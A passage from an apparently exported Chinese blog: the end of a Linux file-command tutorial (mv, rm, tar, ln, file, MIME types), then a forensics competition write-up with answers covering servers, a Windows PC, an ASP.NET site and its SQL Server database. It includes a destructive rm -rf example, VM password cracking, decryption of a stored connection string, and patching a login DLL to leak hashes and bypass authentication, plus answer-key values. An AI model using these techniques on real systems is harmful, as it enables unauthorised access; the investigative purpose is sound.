交互模式\n在覆盖一个已存在的文件前，会先进行提示并要求用户确认，可以有效防止误操作 -n 不覆盖已存在的文件\n如果在目标位置有同名文件，则跳过该操作 -u 更新\n仅当源文件比目标文件新，或者目标文件不存在时，才执行移动操作 -v 显示详细过程\n列出每个文件在移动前后的路径 强制 参数 功能说明 -f 强制\n不经任何提示，直接覆盖已存在的目标文件，通常是默认行为，与-i相反 备份 参数 功能说明 -b[=CONTROL] **备份\n**在覆盖已存在的目标文件时，会为原目标文件创建一个备份 具体使用方法和cp命令该参数一致：cp备份 使用示例 重命名txt文件为jpg\nmv file.txt file.jpg 也可以使用{}一步到位：\nmv file.{txt,jpg} 将当前目录下所有以.log结尾的文件，一次性全部移动到logs目录中（结合通配符）\nmv *.log logs/ 移动文件，显示过程，并进行确认\nmv -iv file dir/ 目录名称最好加上/表示为目录，否则可能进行重命名操作（如果没有该目录的话）\n将目录移动到tmp目录下\nmv dir/ /tmp/ 与cp不同，mv在移动目录时不需要-r参数\nrm —— 删除文件或目录 语法格式 rm [参数] \u0026lt;文件或目录\u0026gt; Linux文件删除的重要特性 与Windows等图形界面的“移动到回收站”不同，rm命令默认是永久性删除 一旦文件被rm删除，通常情况下无法轻易恢复，使用时谨慎再谨慎！ 常用参数 参数 功能说明 -r, -R 递归删除\n这是删除目录时必须使用的参数，它会删除该目录下所有的文件和子目录 -f 强制删除\n忽略不存在的文件，并且从不提示用户进行确认，即使文件是只读的，也会直接删除。 -i **交互模式\n**在删除每个文件前都会进行提示并要求用户确认，可以有效防止误删 -v 显示详细过程，列出每个正在被删除的文件名 使用示例 删除目录下多个文件，每个文件删除之前询问**（结合通配符）**\nrm -i *.tmp 递归删除整个目录及其内容\nrm -r old_project/ 强制递归删除整个目录\nrm -rf dir/ 这个命令组合会强制、无提示地删除一个目录及其全部内容！\n这是一个极其危险的命令组合，常被戏称为“删库跑路”，一定要慎用！\nrmdir —— 删除空目录 语法格式 rmdir [参数] \u0026lt;目录名\u0026gt; rmdir 与 rm -r rmdir是一个专门用来删除空目录的命令，如果目录中含有任何文件或子目录，rmdir命令都会执行失败并报错 由于它只能删除空目录，所以它比rm -r要安全得多 常用参数 参数 功能说明 -p **递归删除目录\n**当子目录被删除后，如果其父目录也因此变成了空目录，则一并删除\n依此类推，直到遇到非空目录为止 -v 显示详细过程 使用示例 删除一个空的目录\nrmdir empty_dir 递归删除空的嵌套目录\nrmdir -p dir1/dir2/dir3 首先删除dir3 目录 然后发现dir2目录变空了，于是也删除dir2目录 最后发现dir1目录也变空了，于是也删除dir1目录 通过一条命令，就可以清理掉一整条空的目录路径\n同时删除多个空目录\nrmdir empty_dir1 empty_dir2/xxx/xxx tar —— 文件归档与压缩工具 tar命令是Linux中用于打包归档和压缩/解压文件的核心工具\n它的名称是 tape archive（磁带归档）的缩写，最初被设计用于将文件备份到磁带上，现在广泛用于将多个文件和目录打包成一个单独的文件\n语法格式 tar命令的参数风格比较独特，其主选项通常不需要在前面加-，但为了统一和清晰，加上-也是完全兼容的\n创建归档 tar [主选项][辅助选项] \u0026lt;归档文件名\u0026gt; \u0026lt;要归档的文件或目录...\u0026gt; 查看归档内容 tar [主选项][辅助选项] \u0026lt;归档文件名\u0026gt; 提取归档内容 tar [主选项][辅助选项] \u0026lt;归档文件名\u0026gt; [要提取的文件...] 归档与压缩 理解tar，需要先区分这两个概念\n归档 这是tar的本职工作，它将许多文件和目录打包成一个单独的大文件（通常称为tarball，以.tar结尾）\n这个过程不减小文件总体积，就像把很多零散物品放进一个大箱子里\n压缩 这是减小文件体积的过程，由gzip, bzip2, xz等专门的压缩工具完成\n通常，我们先用tar将文件归档成一个.tar文件，然后再用gzip等工具将其压缩成.tar.gz\ntar命令提供了便捷的参数（-z, -j, -J），可以在一条命令内连续完成“归档”和“压缩”两个步骤\n常用参数 主选项（必须选择其一） 参数 功能说明 -c 创建一个新的归档文件 -x 从归档文件中提取文件 -t 列出归档文件中的内容，但不提取 -r 向已存在的归档文件末尾追加文件 -u 更新。仅当文件比归档中的同名文件新时，才将其追加到归档中 辅助选项（常用） 参数 功能说明 -f 指定归档文件的名称\n这个参数几乎总是必需的，并且通常放在参数组合的最后 -v 显示详细过程。在处理文件时，将其名称打印在屏幕上 -z 通过gzip进行压缩或解压，生成的文件通常以.tar.gz或.tgz结尾 -j 通过bzip2进行压缩或解压，生成的文件通常以.tar.bz2或.tbz2结尾 -J 通过xz进行压缩或解压，生成的文件通常以.tar.xz结尾 -C 指定一个目录，在解压时，tar会先切换到这个目录，再开始提取文件 \u0026ndash;exclude=PATTERN 在归档时，排除掉匹配PATTERN模式的文件 使用示例 将file文件和dir1目录打包成一个名为archive.tar的归档文件，并显示过程\ntar -cvf archive.tar file1.txt directory1/ 先写打包后的名称（-f），再列举打包的文件\n将两个目录打包并使用gzip压缩，生成archive.tar.gz\ntar -czf archive.tar.gz dir1/ dir2/ 不解压文件，只列出archive.tar.gz压缩包里包含哪些文件和目录\ntar -tzf archive.tar.gz 解压定要选择-x，不选择就不会解压，只是预览\n将archive.tar.gz解压到当前tmp/目录，并显示解压过程\ntar -xzvf archive.tar.gz -C /tmp ln —— 创建文件或目录的链接 ln的名称是 link 的缩写，用于为文件或目录创建链接\n语法格式 ln [参数] \u0026lt;源文件\u0026gt;/\u0026lt;目录\u0026gt; \u0026lt;链接名\u0026gt; 硬链接 (Hard Link) vs. 符号链接 (Symbolic Link) 链接是Linux文件系统的一个重要特性，它允许一个文件拥有多个可访问的路径\nln命令能创建的两种不同的链接类型：硬链接和符号链接（也称软链接）\n特性 硬链接 (Hard Link) 符号链接 (Symbolic Link / Soft Link) 本质 是同一个文件的多个别名，它们共享同一个inode号和数据块，除了路径不同外都共享 是一个独立的文件，其内容是另一个文件的路径，类似Windows的快捷方式 inode号 与源文件相同 拥有自己独立的inode号 权限和访问控制 继承原文件权限 链接权限由链接自身决定（但一般是777），访问成功与否由目标文件的权限决定，同时也要考量是否能进入目标文件所在的目录（对该目录的执行权限） 是否能识别为链接 ❌用ls -l看不出是否为硬链接（除非看 inode） ✅用ls -l明确显示为链接，如 link -\u0026gt; target 跨文件系统 ❌不能跨越不同的文件系统创建 ✅可以跨越不同的文件系统创建 对目录操作 ❌不能对目录创建硬链接 ✅可以对目录创建符号链接 删除源文件后 链接文件依然有效，可以正常访问数据（直到所有硬链接都被删除） 链接文件会失效，因为其指向的路径不再存在 常用参数 参数 功能说明 -s 创建符号链接（软链接），不加此参数则默认创建硬链接 -f 强制\n如果目标位置已存在同名文件或链接，则先将其删除再创建 -i 交互模式\n在覆盖（删除）已存在的目标文件前进行提示 -v 显示详细过程\n显示每个成功创建的链接 使用示例 为file.txt创建一个名为hard_link.txt的硬链接\nln file.txt hard_link.txt 可以使用ls -i命令查看，会发现它们的inode号完全相同\n在用户主目录下强制创建一个名为nginx_access.log的符号链接，指向Nginx的访问日志文件\nln -sf /var/log/nginx/access.log ~/nginx_access.log 为/mnt/disk1这个目录创建一个符号链接\nln -s /mnt/disk1 ~/disk1_link 执行cd ~/disk1_link就等同于执行cd /mnt/disk1，和快捷方式是一个用法\nfile —— 辨别文件类型 file命令是Linux中一个用于探测并显示文件类型的工具\n它不依赖于文件的扩展名，而是通过一系列的测试来确定文件的真实类型\n语法格式 file [参数] \u0026lt;文件名\u0026gt; Linux文件类型与“魔数” 在Windows系统中，文件类型通常由其扩展名（如.txt, .exe）决定\n然而，在Linux中，文件扩展名主要是为了方便用户识别，系统本身并不依赖扩展名来判断文件类型\n一个可执行文件可以没有任何扩展名！\nfile命令主要通过三种测试来判断文件类型：\n文件系统测试：首先检查文件是否是目录、符号链接、Socket等内核已知的特殊文件 魔数测试：接下来，它会检查文件开头的几个字节，这部分字节被称为**“魔数”（Magic Number）**，几乎所有标准文件类型（如JPEG, PNG, ELF可执行文件）都有一个独特的、像“指纹”一样的魔数 语言测试：如果文件看起来像是一个文本文档，file会尝试分析其内容，判断它可能是哪种编程语言的源码（如C, Shell, Python）或配置文件 常用参数 核心功能 参数 功能说明 -b 简介模式\n不输出文件名，只输出文件类型描述 -i 以MIME类型格式输出，而不是人类可读的描述\n例如输出image/jpeg而不是JPEG image data... -L 跟随符号链接\n默认情况下，file会报告这是一个符号链接；使用此参数，它会去分析链接指向的那个原始文件。 -z 尝试查看压缩文件内部的内容类型 文件列表控制 参数 功能说明 -f \u0026lt;列表文件\u0026gt; 从指定的列表文件中读取要检查的文件名列表，而不是在命令行上指定 使用示例 识别一个未知文件的类型\nfile unknown_file 输出示例： unknown_file: PNG image data, 1024 x 768, 8-bit/color RGB, non-interlaced\nfile可以清晰地区分可执行的二进制文件和可读的文本文件\n# 查看bash程序的文件类型 file /bin/bash # 查看一个shell脚本的类型 file ~/.bashrc 输出示例： /bin/bash: ELF 64-bit LSB pie executable, x86-64... ~/.bashrc: UTF-8 Unicode text\n查看符号链接及其指向的原始文件\n# 先创建一个符号链接 ln -s /bin/bash ./my_bash_link # 默认行为：识别链接本身 file my_bash_link # 使用-L参数：识别链接指向的文件 file -L my_bash_link 输出示例： my_bash_link: symbolic link to /bin/bash my_bash_link: ELF 64-bit LSB pie executable, x86-64...\n批量识别文件类型\nfile * file拓展 —— MIME类型 什么是MIME类型 MIME（Multipurpose Internet Mail Extensions）类型，又称为媒体类型（Media Type），用于标识文件或数据的格式和性质\n它最初为电子邮件附件设计，但现在广泛应用于HTTP协议、浏览器内容协商等\nMIME类型的格式 type/subtype type是主类型（比如 text, image, application 等） subtype是具体的格式（比如 jpeg, png, json） 常见MIME类型 text 子类型（常见格式） 说明 plain 纯文本内容，无格式修饰（如.txt文件） html HTML超文本标记语言（网页源代码） css 层叠样式表（网页样式） csv 逗号分隔值文本，常用于表格或数据库导出 javascript / js JavaScript脚本代码 xml 可被人类和机器读取的标签化数据格式 markdown / md Markdown标记语言，常用于文档编写 yaml / yml 简洁的配置文件格式，常用于开发与部署 image 子类型（常见格式） 说明 jpeg / jpg 有损压缩的位图图像格式 png 无损压缩的位图图像格式，支持透明 gif 支持动画和透明的图像格式 bmp Windows位图图像格式，不压缩 svg+xml 可缩放的矢量图像，基于XML webp Google开发的高效图像格式，兼顾压缩率和质量 ico Windows图标格式 tiff / tif 高质量图像格式，常用于扫描、印刷 audio 子类型（常见格式） 说明 mpeg / mp3 有损压缩音频格式 wav 无损音频格式，体积大 ogg 开放格式音频容器 aac 高压缩率音频格式，常用于流媒体 flac 无损压缩音频格式 opus 适用于语音和流媒体的高效音频格式 quicktime / mov Apple开发的视频格式，兼容性强 video 子类型（常见格式） 说明 mp4 最常见的视频格式，压缩效率高 mpeg 老的视频格式，兼容性好 ogg 支持视频的OGG容器格式（如.ogv） webm Google开发的为网页优化的视频格式 avi 微软开发的老视频格式 x-matroska / mkv 多媒体容器格式，支持多轨音视频 application 子类型（常见格式） 说明 json 结构化数据交换格式，广泛用于 API xml 结构化文档或数据 pdf Adobe的便携文档格式 zip 常见的压缩文件格式 x-www-form-urlencoded HTML表单默认提交格式（键值对编码） octet-stream 二进制数据流，常用作通用下载类型（未知二进制数据） msword 旧版Microsoft Word 文档（.doc） vnd.ms-excel 旧版Microsoft Excel 表格（.xls） vnd.openxmlformats-officedocument.wordprocessingml.document 新版Office Word（.docx） vnd.openxmlformats-officedocument.spreadsheetml.sheet 新版Office Excel（.xlsx） x-tar .tar归档文件格式，用于打包多个文件 x-7z-compressed 7-Zip压缩格式（.7z） x-rar-compressed RAR压缩格式（.rar） x-debian-package Debian软件包格式（.deb） x-executable Linux/Unix可执行文件（无拓展名时也可用此类型） x-shockwave-flash Flash动画格式（已淘汰） javascript JavaScript代码**（部分浏览器仍使用application而非text）** multipart 子类型（常见格式） 说明 form-data 用于上传文件的表单数据 mixed 多部分邮件体，每部分可以是不同类型 alternative 同一内容的多种表示（如 HTML 和纯文本版本的邮件） byteranges 用于分块下载/断点续传 message 子类型（常见格式） 说明 rfc822 标准电子邮件消息格式 partial 邮件的部分片段 external-body 邮件外部引用内容 font 子类型（常见格式） 说明 woff, woff2 Web优化字体格式 truetype / ttf 常见字体格式 opentype / otf TTF的扩展格式，功能更丰富 embedded-opentype EOT字体，IE专用的Web字体格式 ","date":"2025-08-06T13:08:02+08:00","image":"http://picture.928330.xyz/typora/fb86b7621fba4d5ef41dce013ca5a72e.jpg","permalink":"https://blog.928330.xyz/p/linux%E5%91%BD%E4%BB%A4%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%AF%87/","title":"Linux命令（文件管理篇）"},{"content":"题目：https://ks.wjx.top/vj/rX5h1WB.aspx\n难难难，不多说了，直接开始\n火眼仿真创建虚拟机 要创建虚拟机，必须要有VMware环境\n创建虚拟机 -\u0026gt; 添加镜像 -\u0026gt; 选择镜像文件之后在上面勾选对应镜像 -\u0026gt; 点击确定\n选择生成位置（虚拟机位置） -\u0026gt; 开始创建\n创建完成之后会给出账号密码，可以记忆一下，或者重置为空（推荐）\npart1 1.检材1的操作系统版本是 创建完虚拟机后，就会自动识别出系统版本：\nCentOS Linux release 7.6.1810(Core) 2.检材1中，操作系统的内核版本是 找半天不知道检材1怎么登录的root账号，结果最后试出来了密码\u0026hellip;\u0026hellip;：\nroot/123456 后面才知道这是火眼帮我改的，我们也可以手动设置\n创建虚拟机 -\u0026gt; 高级设置：\n这里就可以设置各种内容\n纯命令行界面还是太难操作了，使用Xterminal连接一下\nsystemctl start sshd打开服务，看一下监听端口，是7001：\n在Xterminal连接后，查看内核版本：\nuname -r 3.10.0-957.el7.x86_64 3.检材1磁盘包含一个LVM逻辑卷，该LVM开始的逻辑区块地址（LBA）是 查看磁盘分区：\nfdisk -l 根据System字段类型里的LVM判断/dev/sda2是我们要找的分区\n2099200 4.检材1中网站\u0026quot;www.kkzjc.com\u0026quot;对应的Web服务对外开放的端口是 尝试使用nmap扫描服务器端口，但没有给出什么有用的信息\n使用grep命令直接在服务器上搜索\u0026quot;www.kkzjc.com\u0026quot;\n因为是网站的配置文件通常在 /etc目录下，现在/etc下搜索更快一点：\n32000 5.检材1所在的服务器共绑定了几个对外开放的域名 既然/etc下有配置文件，就把nginx和apache的都搜一遍： 看来只有nginx，一共开放了三个域名\n3 6.检材1所在的服务器的原始IP地址是 看不明白这一题问的是什么，跟着wp做一遍\n见第九题\n7.嫌疑人曾经远程登录过检材1所在的服务器，分析并找出其登录使用的IP地址是 (并使用该地址解压检材2) 使用last命令查看，发现有两个ip登陆过该服务器（192.168.204.1是我使用Xterminal连接的）： 正确的ip可以解压检材2，检材2是分卷压缩，使用winrar解压缩\n192.168.99.222 8.检材1所在的服务器，其主要功能之一为反向代理。找出\u0026quot;www.kkzjc.com\u0026quot;转发的后台网站所使用的IP地址是 首先查看命令行history，发现该服务器有docker镜像： 开启docker服务，看一眼镜像和容器都有哪些\nsystemctl start docker systemctl status docker docker images docker ps 这里发现一个正在运行的nginx服务器，而且他的映射到本机的端口号是8091，和第四题配置文件中的一样：\n进入docker的交互式终端，查看该终端里运行过的命令：\ndocker exec -it 08f64376a2e3 /bin/bash history 可以看到曾经多次查看过配置文件/etc/nginx/conf.d/hl.conf：\n我们也打开这个配置文件看看，发现了反向代理的ip：\n192.168.1.176 9.嫌疑人曾经从题7的IP地址，通过WEB方式远程访问过网站，统计出检材1中该IP出现的次数为 查看docker容器日志，统计其中的ip出现次数，-c参数可输出统计总数：\ndocker logs 08f6437 | grep -c \u0026#34;192.168.99.222\u0026#34; 18 同时在日志还能发现这个ip在访问服务器的时候是由ip192.168.99.3接受的，且端口号就是之前的8091：\n这样就发现了题6的答案：\n192.168.99.3 part2 10.检材 2 的原始磁盘 SHA256 值为 2D926D5E1CFE27553AE59B6152E038560D64E7837ECCAD30F2FBAD5052FABF37 11.检材2 所在计算机的OS内部版本号是 18363.1082 12.检材2所在计算机最后一次正常关机的时间为（精确到秒） 2020-09-22 13:15:34 13. 检材2中，VMware 程序的安装时间为（精确到分钟） 2020-09-18 17:57 14.检材2中，Vmware.exe程序总计启动过几次 8 15.嫌疑人通过 Web 方式，从检材2访问检材1所在的服务器上的网站时，连接的目标端口是 在chrome浏览器中发现代理登录的记录：\n登录的端口和之前看到的代理端口一致\n8091 16.接15题，该端口上运行的进程的程序名称（Program name）为 docker-proxy 17.嫌疑人从检材2上访问该网站时，所使用的域名为 下面就是对应域名（同样是代理登录8091端口）：\nwww.sdhj.com 18.检材2 中，嫌疑人所使用的微信ID是 检材二的电脑里面并没有安装微信\n但在检材二嵌套证据识别部分能看见一个ios手机备份，查看路径能发现是在分区三下\n把当前文件夹下的所有文件导出作为文件集合作为新检材分析，发现里面有微信号：\nsstt119999 19.分析检材2，嫌疑人为推广其网站，与广告位供应商沟通时使用的通联工具的名称为 接上一步，创建出来的ios镜像不完整，找不到题目要求的信息\n真正的做法是使用同样位于分区三下的另一个镜像：\n这样就能发现沟通工具：\ntelegram 20.分析检材2，嫌疑人使用虚拟货币与供应商进行交易，该虚拟货币的名称是 在上题聊天记录中找到一张收款码图片，用的是狗狗币DOGE\nDOGE 21.上述交易中，对方的收款地址是 见上图\nDPBEgbwap7VW5HbNdGi9TyKJbqTLWYYkvf 22.上述交易中，嫌疑人和供应商的交易时间是 这里不知道怎么写，wp说可以通过Dogecoin浏览器使用交易地址搜索到交易： https://explorer.coinex.com/doge 2020-09-20 12:19:46 23.上述交易中，嫌疑人支付货币的数量为 见上题图\n4000 24.检材2中，嫌疑人使用的虚拟机的虚拟磁盘被加密，其密码为 虚拟机在嵌套证据识别中就已经见过，导出备用，这里以防万一我导出了整个存放虚拟机的文件夹：\n微信聊天记录里说他忘记了密码，要去github上找办法： 之前翻看浏览器的时候就看见了github网页，我们也看看那个破解工具网站：\n-v指定虚拟机，-d指定字典，就使用它演示使用的这条命令：\npython3 pyvmx-cracker.py -v Windows10x64.vmx -d wordlist.txt 得到密码：\nzzzxxx 25.检材2中，嫌疑人发送给广告商的邮件中的图片附件的 SHA256值为(忽略邮件状态) 下面的步骤建议直接导入火眼证据分析，使用虚拟机反而徒增麻烦\n打开虚拟机，发现有密码：\n办法是使用火眼仿真，仿真完毕就会给出密码\n不过在此之前，我们要先给虚拟机的加密给取消：\n再次使用火眼仿真就能得到密码：\n之前聊天记录提到广告使用邮件发送，在桌面的邮箱软件的草稿箱找到广告图片：\n保存到桌面，使用certutil计算sha256（这个版本的powershell没有getfilehash）：\ncc7ea3ab90ab6b28417e08c715c243ce58ea76d71fd141b93f055a58e9ba561a 26.检材2中，嫌疑人给广告商发送广告图片邮件的发送时间是(忽略邮件状态) 2020-09-20 12:53 27.检材2中，嫌疑人的邮箱密码是 把.vmdk文件作为镜像文件导入成新检材（早知道能导入我就不那么别扭使用虚拟机了气死我了）：\nhonglian7001 28.检材2中，嫌疑人使用了什么远程管理工具，登录了检材1所在的服务器？ Xshell不是全称，具体名称在安装软件中看，或者虚拟机里面也能看见：\nXshell6 29.检材2中，嫌疑人使用上述工具连接服务器时，使用的登录密码为 qwer1234!@#$ part3 30.检材3 的原始磁盘 SHA256 值为 FF593FCCB3770B8845A3334631F8E80807638EE722C5AA7B34E877589857C3BA 31.检材3 所在的计算机的操作系统版本是 Windows Server 2008 HPC Edition x64 32.检材3中，部署的网站名称是 火眼仿真检材三（一定记得把密码重置成空！！！）\n登录server账号，打开服务器管理器：角色 -\u0026gt; web服务器 -\u0026gt; internet信息服务 -\u0026gt; win -\u0026gt; 网站\n可以看到有一个托管的网站：\ncard 33.检材3中，部署的网站对应的网站根目录是 高级设置： C:\\inetpub\\wwwroot\\v7w 34.检材3中，部署的网站绑定的端口是 同上图：\n80 35.检材3中，具备登陆功能的代码页，对应的文件名为 右侧导航栏浏览，发现一个名为web的配置文件：\n使用记事本打开，可以看见里面有两条疑似与login相关的配置：\n分别查看两个文件，发现都跟登录有关：\n本地访问一下，发现竟然都是登录界面：\n分不清，真的分不清啊，都写上去吧：\nglogin.aspx dllogin.aspx 不过其实是有办法分开的，具体看下面一题\n36.检材3中，请对网站代码进行分析，网站登录过程中，代码中对输入的明文密码作了追加什么字符串处理 再次检索前面两个文件，发现只有dllogin.aspx涉及到了对密码字符串的处理：\nOvO 同时也知道了35题的正确答案：\ndllogin.aspx 37.检材3中，请对网站代码进行分析， 既然是找动态链接库，那么在dllogin.aspx里面搜索一下dll：\n虽然没有找到，不过也给了点启发，问问ai： 为了保险起见，我们直接去检材三里面搜索一下是否有这个文件：\nApp_Web_dllogin.aspx.7d7c2f33.dll 38.检材3中，网站登录过程中，后台接收到明文密码后进行加密处理，首先使用的算法是 Encryption 中的什么函数 dll文件编译后无法查看，没有头绪，原来是需要逆向dll\n下载net反编译工具dnspy：https://github.com/dnSpy/dnSpy/releases\n导出上题找到的dll文件，拖入dnspy寻找：\nAESEncrypt 39.检材3中，分析该网站连接的数据库地址为（并使用该地址解压检材4） 多少沾点玄学在这里了\n在逆向出来的.net中发现引用了一个数据库有关的库DBManager：\n搜索发现这个库也在检材三中：\n导出分析，在最底部看见数据库地址：\n192.168.1.174 40.检材3中，网站连接数据库使用的密码为 在DBManager里面找到下面这一段：\nprivate void Open() { if (this.Conn == null) { this.Conn = new SqlConnection(this.ConnStr); } } 只在this.Conn为null时使用ConnStr，也就是上一题得到的密码\n如果不为空，那么优先使用的是AESDecrypt解密出来的连接串，所以我们要想法解密：\nMcyj19i/VubvqSM21YPjWnnGzk8G/GG6x9+qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK/g8DDRAQ+X0GtJ8w== 因为这是Encryption类下面的方法，并且都是windows系统，我们也可以在本机调用解密：\nAdd-Type -Path \u0026lt;Path/to/DBManager.dll\u0026gt; [DBManager.Encryption]::AESDecrypt( \u0026#34;Mcyj19i/VubvqSM21YPjWnnGzk8G/GG6x9+qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK/g8DDRAQ+X0GtJ8w==\u0026#34;, \u0026#34;HL\u0026#34;, \u0026#34;forensix\u0026#34; ) 再次印证了39题答案是正确的，并且给出了真正的密码：\nc4f2737e88 41.检材3中，网站连接数据库服务器的端口是 见上题，ip后就是端口：\n1433 part4 做好准备，接下来的路不是一般的难走\n42.检材 4 的原始磁盘SHA256 值为 E5E548CCAECD02608A0E053A5C7DCDBFBDD4BE5B0E743EB9DC8E318C369BEBC8 43.重构该网站，分析嫌疑用户的推广链接中参数里包含的 ID 是 现在的目标是连接检材3（服务器）和检材4（数据库）\n登录检材4，看一眼history：\n看来是先尝试了在本机安装数据库，后面还是选择使用docker了\n启动docker，查看现在的docker容器，启动sql1：\n检材3能知道连接数据库的地址是192.168.1.174，所以要修改检材4的ip\n先在编辑 -\u0026gt; 虚拟网络编辑器中关闭DHCP，防止使用DHCP分配的地址\n应用并确定后，进入检材4，修改网卡配置文件：\nvi /etc/sysconfig/network-scripts/ifcfg-ens33 改成下面这样：\n重启网络，用ip a命令查看配置是否成功：\n再次登录检材3，ping一下检材4，看看是否能通： 说明他们在同一个网段了，我们之前的配置是成功的\n由于检材三没有数据库应用，接下来我们要在本机连接数据库，那就要让本机和他们也在同一网段\n打开vmware -\u0026gt; 编辑 -\u0026gt; 虚拟网络编辑器，把使用的，然后更改子网IP和NAT网关为192.168.1.0/24网段：\n点击应用和确定，在本机ipconfig一下\n可以看见net8，也就是nat模式，ipv4地址是192.168.1.1，配置成功： 使用40题的解密结果测试连接，结果报错了：\n需要下载SQL SERVER驱动程序：\nhttps://learn.microsoft.com/zh-cn/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16 安装后再次测试连接，成功！\n接下来回到App_Web_dllogin.aspx.7d7c2f33.dll中\n在登录部分我们可以看到调用了DUserLogin函数，而这个函数又是来自WDUser类：\n这个类来自哪里呢？看不出来，问一下ai吧\n不嫌麻烦保险起见也可以全部导出using了的dll，这个操作其实是最正确的，后面也会用上\n不过这里就取个巧先：\n既然不是系统库，那么我们照样能在检材3里面找到这个dll，老样子导出用dnspy分析\ndnspy很方便，如果有对应函数，点击即可跳转至对应位置，果然是在WBus里面：\n在DUserLogin函数里使用了PD_UserLogin这个数据库函数，我们在数据库里面找到它：\n函数说明登录方式分两种，由TD_Webs表的DW_Type决定：\nDW_Type = 0：只允许指定的DW_DU_Id用户登录 DW_Type = 1：允许任意用户登录（只验证用户名和密码） 并且在之前反编译出来的dll登录逻辑中，我们知道了用户名密码是经过加密的，存放在表里的是加密过的值：\ntext2 = Encryption.AESEncrypt(text2, \u0026#34;forensix\u0026#34;, \u0026#34;HL\u0026#34;); text2 = FormsAuthentication.HashPasswordForStoringInConfigFile(text2, \u0026#34;MD5\u0026#34;); 二者结合，如果要让某个用户能登录，就要确保他的DU_Id =TD_Webs.DW_DU_Id，并且将他的密码改为指定值加密后的结果写入DU_Pwd\n我们先找到用户表：\n在检材二中的chrome浏览器的表单记录中，我们能找到liwente1314520的登录记录：\nliwente1314520对应的DU_Id 是1001，也对应TD_Webs表里面的aaaa.bbbb，相应DW_Type是0\n在检材3的登录页面逻辑中我们知道，登录方式是\u0026quot;密码\u0026quot;+\u0026ldquo;OvO\u0026rdquo;\n我们用这种方式制作一个密码，先AESEncrypt加密，再MD5加密（这一步我做错了，先别急着复制，往下看）：\nAdd-Type -Path \u0026lt;Path/to/DBManager.dll\u0026gt; [DBManager.Encryption]::AESEncrypt( \u0026#34;111OvO\u0026#34;, \u0026#34;HL\u0026#34;, \u0026#34;forensix\u0026#34;) 把1001对应的TD_Webs.DW_DU_Id改成192.168.1.176，也就是检材3的ip，让我们能访问：\nTD_User.DW_Pwd改成加密的密码：\n保存之后，在检材4重启sql1容器，在检材3中开启ASP.NET State Service服务：\n之后可以在本机访问http://192.168.1.176/dl进行登录操作：\n可是到这一步，我登录竟然不成功！\n我以为是之前的md5没有大写的原因，可是就算我改成了大写，仍旧是不成功\n后面发现是我把加密函数参数位置写错了，正确应该是这样（太铸币了啊）：\nAdd-Type -Path \u0026lt;Path/to/DBManager.dll\u0026gt; [DBManager.Encryption]::AESEncrypt( \u0026#34;111OvO\u0026#34;, \u0026#34;HL\u0026#34;, \u0026#34;forensix\u0026#34;) 不过当时我认为走流程自己计算密码这一步显然是走不太通了，那我们就得换一个思路：直接让它为我们输出密码\n进入控制登录的App_Web_dllogin.aspx.7d7c2f33.dll，在oCmd函数部分右键，编辑：\n加入和修改这三处，目的是登录失败的时候弹窗弹出当前使用密码加密后的md5值： 点击编译，注意一定要把上面的非系统引用库也导出并拖进dnspy，否则编译会失败：\n编译完成之后点击保存（名称不能变），复制并替换检材三C:\\inetpub\\wwwroot\\v7w\\bin下的同名dll：\n之后重启网站：\n再次访问http://192.168.1.176/dl，使用账号liwente1314520，密码随便（但是一定要记住）登录：\n果然报错，不过也带出了加密后的密码！\n复制这个md5值作为密码，再次更改数据库内容，保存，重启sql1服务\n我们就能使用上一次登录的密码登录了：\n总算是搭建并登录了，也不能忘了我们的目标：嫌疑用户的推广链接中参数里包含的ID\n一同翻找，在代理信息栏里发现了推广链接：\nabe6d2ee630379c3 44.重构该网站，该网站后台的代理用户数量为 用户列表里面数一下，一共三页：\n26 45.重构该网站，该网站注册用户中共有过几个代理(包含删除的数据) 上一题是代理用户数量，这一题问的是包括删除的数据，我们就需要找到对应的表\n鼠标移动到用户列表按钮，左下角会显示对应的aspx文件：\n在检材3里面搜索该文件（火眼也行）：\n在文件开头找到使用的库，其实也就是上图我们搜出来的第二个文件：\n导入dnspy分析，同样找到和数据库交互的函数：\n它同样是在WBus的WUUser里面，使用的表名是TU_User：\n数据库里面找到该表，统计一下总数：\n32 46.重构该网站，对补发记录进行统计，统计 2019 年10 月1日后补发成功的金额总值 分析方法和上一题一模一样，就是网站配置文件 -\u0026gt; dll -\u0026gt; 逆向找数据库表\n同样的，我们找到补发测试的文件：\n中间寻找的过程就跳过，直接上逆向结果：\n这里找到的VY_TestLog不是表，是一个视图：\n在dll里面我们还能知道补发成功的逻辑：\nif (dataTable.Rows[i][\u0026#34;YY1T_Type\u0026#34;].ToString() == \u0026#34;3\u0026#34;) 也就是说，如果YY1T_CState == \u0026quot;100\u0026quot;，则认为是成功的\n我们只需要查询视图中YY1T_CState字段为100，且YY1T_CDate在2019.10.1后的补发金额（YY1T_Money）总值：\nselect sum(YY1T_Money) from VY_TestLog where YY1T_CState = 100 and YY1T_CDate \u0026gt; \u0026#39;2019-10-01 00:00:00\u0026#39; 138408.0000 47.检材 4 中，对\u0026quot;TX_IpLog\u0026quot;表进行分析，所有在\u0026quot;武汉市\u0026quot;登录的次数为 找到该表：\n没什么弯绕，就是sql查询：\nselect count(*) from TX_IpLog where XIL_Info like \u0026#39;\u0026#39;%武汉%\u0026#39;\u0026#39; 2829 48.重构该网站，该嫌疑人下属代理\u0026quot;liyun10\u0026quot;账户下的余额有多少元 点击结算管理，显示出了余额，说明我们页面没有找错：\n找到对应aspx文件，找dll，逆向：\n很奇怪，这里竟然什么逻辑也没有，猜测是继承的父类Page_zhye\n这里唯一一个非系统库就是RootDPage，同样在检材3里面找到导出逆向\n果然，里面写出了完整的余额查询逻辑，而所有数据来源都是MInfo：\n这个函数也来自WBus，里面调用的是数据库中间处理函数PD_MInfo：\n在数据库找到PD_MInfo这个函数：\n这个查询里面涉及了很多张表，一一查看\n最终，在TD_MJiFen里面能找到一条数据，id就是我们登录的账号liwente1314520的，余额也对应：\n可是除此之外再也找不到其他的用户了，这是怎么回事？\n之前我们有使用到过用户表，是TU开头，而这个表是TD开头，那么用户是否也有一张一样的表呢？\n果然，我们找到了TU_MJiFen表！\n这个里面记录的就是所有用户的余额等信息，根据TD_MJiFen表，_JiFen字段就是真正的余额：\n同样的，我们还能找到对应的PU_MInfo函数：\n在TU_User表里面，我们能找到liyun10对应的id是1049：\n根据之前的PU_MInfo函数，它比对的是UMJF_UU_ID，也就是说在这个字段找1049：\n或者直接使用